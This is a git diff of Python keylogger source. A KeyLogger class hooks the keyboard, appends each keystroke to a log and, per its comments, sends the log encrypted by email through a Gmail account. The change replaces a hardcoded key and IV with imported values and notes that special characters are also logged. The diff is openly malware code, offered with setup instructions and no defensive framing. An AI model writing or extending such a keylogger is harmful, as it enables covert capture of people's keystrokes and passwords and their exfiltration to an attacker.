@@ -5,7 +5,7 @@ import threading
 # You need to create a file to store the receiver and sender email address.
 # You also need the app password of both the receiver and sender email address.
 # The email server is "imap.gmail.com"
-from authentications import receiver_email, sender_email, app_password_sender, email_server
+from authentications import key, iv, receiver_email, sender_email, app_password_sender, email_server
 
 # Default port for Secure Mail Transfer Protocol Secure
 PORT = 465
@@ -14,8 +14,9 @@ PORT = 465
 class KeyLogger:
     def __init__(self):
         # The key and iv is the password to the encrypted message when transmitting through email.
-        self.key = b'\xc8\x88\xc6\xbe\xde\x85\xbc\x1f\xeb\xa4\xc2\xa4\x04\x0f\x9b\xd5'
-        self.iv = b'\x98>\xf8\xac9\x890I\xfa\xd2>p\r\xfa\x91\x83'
+        # The key and iv should be a random 16 bytes
+        self.key = key
+        self.iv = iv
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.log_keys = ''
 
@@ -36,7 +37,7 @@ class KeyLogger:
     def on_press(self, key):
         self.send_data()
 
-        # The keylogger only logs alphanumeric keys
+        # The keylogger only logs alphanumeric keys and special characters.
         try:
             self.log_keys += key.char
         except AttributeError:
